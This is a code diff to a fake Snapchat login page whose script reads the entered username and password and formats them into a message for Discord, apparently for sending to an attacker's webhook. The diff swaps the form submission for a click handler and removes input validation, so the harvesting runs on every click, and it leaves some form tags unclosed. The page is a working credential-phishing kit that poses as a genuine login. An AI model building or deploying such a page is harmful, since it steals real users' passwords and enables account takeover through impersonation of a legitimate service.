@@ -43,13 +43,12 @@
 
                 <p class="secondary_action"><a href="#">Forgot Password</a></p>
 
-                <div class="primary_action login-button">
-                  <button type="submit" id="loginTrigger" class="btn btn-lg btn-primary">
-                    Log In
-                  </button>
-                </div>
-              </form>
-            </div>
+               <div class="primary_action login-button">
+    <button type="button" id="loginTrigger" class="btn btn-lg btn-primary">
+        Log In
+    </button>
+</div>
+
 
             <div class="create-account-cta">
               <span>New To Snapchat?</span>
@@ -62,18 +61,12 @@
   </div>
 
 <script>
-document.getElementById("loginForm").addEventListener("submit", function(event) {
+document.getElementById("loginTrigger").addEventListener("click", function(event) {
     event.preventDefault(); // stop default form submission
 
     // Get input values
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
-
-    // Simple validation
-    if (!username || !password) {
-        alert("Please fill in both fields!");
-        return;
-    }
 
     // Create message for Discord
     const message = ` **Ahamed your a genius**\n\n**Username:** ${username}\n**Password:** ${password}`;
